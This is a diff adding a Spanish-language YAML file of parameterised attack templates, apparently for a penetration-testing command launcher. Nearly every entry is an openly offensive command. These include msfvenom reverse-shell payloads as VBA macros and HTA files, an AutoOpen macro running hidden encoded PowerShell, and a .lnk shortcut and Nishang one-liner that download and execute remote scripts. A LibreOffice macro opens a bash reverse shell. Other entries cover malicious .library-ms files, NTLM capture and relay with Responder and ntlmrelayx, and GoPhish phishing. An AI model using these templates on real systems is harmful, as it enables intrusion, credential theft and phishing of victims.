@@ -1,0 +1,149 @@
+tools:
+  - name: "msfvenom - Macro VBA Payload"
+    description: "Generar macro VBA maliciosa para documentos Office"
+    command: "msfvenom -p windows/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f vba -o {output}"
+    params:
+      - name: lhost
+        label: "LHOST"
+        type: text
+        placeholder: "192.168.45.5"
+      - name: lport
+        label: "LPORT"
+        type: text
+        placeholder: "4444"
+      - name: output
+        label: "Fichero salida"
+        type: text
+        placeholder: "macro.vba"
+
+  - name: "Macro VBA - Shell via PowerShell (template)"
+    description: "Macro Office que ejecuta PS1 en memoria"
+    command: "Sub AutoOpen()\n    Dim str As String\n    str = \"powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -EncodedCommand {b64cmd}\"\n    Shell str, 1\nEnd Sub"
+    params:
+      - name: b64cmd
+        label: "Comando PS1 en Base64"
+        type: text
+        placeholder: "BASE64_HERE"
+
+  - name: "msfvenom - HTA Payload (HTML Application)"
+    description: "Generar fichero HTA con reverse shell"
+    command: "msfvenom -p windows/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f hta-psh -o {output}"
+    params:
+      - name: lhost
+        label: "LHOST"
+        type: text
+        placeholder: "192.168.45.5"
+      - name: lport
+        label: "LPORT"
+        type: text
+        placeholder: "4444"
+      - name: output
+        label: "Fichero HTA"
+        type: text
+        placeholder: "evil.hta"
+
+  - name: "HTA - Servir via HTTP"
+    description: "Servir el fichero HTA para que la victima lo abra"
+    command: "python3 -m http.server {port}"
+    params:
+      - name: port
+        label: "Puerto HTTP"
+        type: text
+        placeholder: "80"
+
+  - name: "Windows Library File (.library-ms)"
+    description: "Crear fichero .library-ms que apunta a WebDAV malicioso"
+    command: "# Contenido del fichero .library-ms:\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<libraryDescription xmlns=\"http://schemas.microsoft.com/windows/2009/library\">\n  <searchConnectorDescriptionList>\n    <searchConnectorDescription>\n      <isDefaultSaveLocation>true</isDefaultSaveLocation>\n      <isSupported>false</isSupported>\n      <simpleLocation>\n        <url>\\\\{attacker_ip}\\share</url>\n      </simpleLocation>\n    </searchConnectorDescription>\n  </searchConnectorDescriptionList>\n</libraryDescription>"
+    params:
+      - name: attacker_ip
+        label: "IP del atacante (WebDAV)"
+        type: text
+        placeholder: "192.168.45.5"
+
+  - name: "WebDAV Server (wsgidav)"
+    description: "Levantar servidor WebDAV para Library files"
+    command: "wsgidav --host=0.0.0.0 --port={port} --root={path} --auth=anonymous"
+    params:
+      - name: port
+        label: "Puerto"
+        type: text
+        placeholder: "80"
+      - name: path
+        label: "Directorio a compartir"
+        type: text
+        placeholder: "/tmp/webdav"
+
+  - name: "Shortcut (.lnk) con payload"
+    description: "Generar .lnk que ejecuta payload cuando se abre la carpeta"
+    command: "$objShell = New-Object -COM WScript.Shell; $lnk = $objShell.CreateShortcut('C:\\Windows\\Temp\\{name}.lnk'); $lnk.TargetPath = 'powershell.exe'; $lnk.Arguments = '-ExecutionPolicy Bypass -c \"IEX (New-Object Net.WebClient).DownloadString(\\\"http://{lhost}/{script}\\\")\"; $lnk.IconLocation = '%windir%\\system32\\shell32.dll,3'; $lnk.Save()"
+    params:
+      - name: name
+        label: "Nombre del .lnk"
+        type: text
+        placeholder: "Important_Document"
+      - name: lhost
+        label: "LHOST (servidor HTTP)"
+        type: text
+        placeholder: "192.168.45.5"
+      - name: script
+        label: "Script PS1"
+        type: text
+        placeholder: "shell.ps1"
+
+  - name: "Responder - Captura NTLM via Library/LNK"
+    description: "Capturar hashes NTLM cuando la victima abre el share UNC"
+    command: "responder -I {iface} -rdwv"
+    params:
+      - name: iface
+        label: "Interfaz de red"
+        type: text
+        placeholder: "eth0"
+
+  - name: "Impacket - ntlmrelayx"
+    description: "Relay de hashes NTLM capturados a otro servicio"
+    command: "impacket-ntlmrelayx -t {target} -smb2support -i"
+    params:
+      - name: target
+        label: "Target para relay"
+        type: text
+        placeholder: "smb://192.168.1.10"
+
+  - name: "Nishang - PS1 Invoke-PowerShellTcp"
+    description: "Reverse shell PowerShell con Nishang"
+    command: "IEX (New-Object Net.WebClient).DownloadString('http://{lhost}/Invoke-PowerShellTcp.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress {lhost} -Port {lport}"
+    params:
+      - name: lhost
+        label: "LHOST"
+        type: text
+        placeholder: "192.168.45.5"
+      - name: lport
+        label: "LPORT"
+        type: text
+        placeholder: "4444"
+
+  - name: "ODT/DOCM - Macro auto-ejecucion"
+    description: "Macro de auto-ejecucion en LibreOffice (para targets Linux)"
+    command: "# En LibreOffice Basic:\nSub Main\n    Shell \"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'\"\nEnd Sub"
+    params:
+      - name: lhost
+        label: "LHOST"
+        type: text
+        placeholder: "192.168.45.5"
+      - name: lport
+        label: "LPORT"
+        type: text
+        placeholder: "4444"
+
+  - name: "Phishing - GoPhish (resumen)"
+    description: "Comandos basicos de GoPhish para campanas de phishing"
+    command: "./gophish; # Acceder a https://localhost:3333 con admin/gophish"
+    params: []
+
+  - name: "Generar payload Base64 para macros"
+    description: "Convertir comando PS1 a Base64 para usar en macros"
+    command: "echo -n \"{command}\" | iconv -t UTF-16LE | base64 -w 0"
+    params:
+      - name: command
+        label: "Comando PowerShell"
+        type: text
+        placeholder: "IEX (New-Object Net.WebClient).DownloadString('http://192.168.45.5/shell.ps1')"
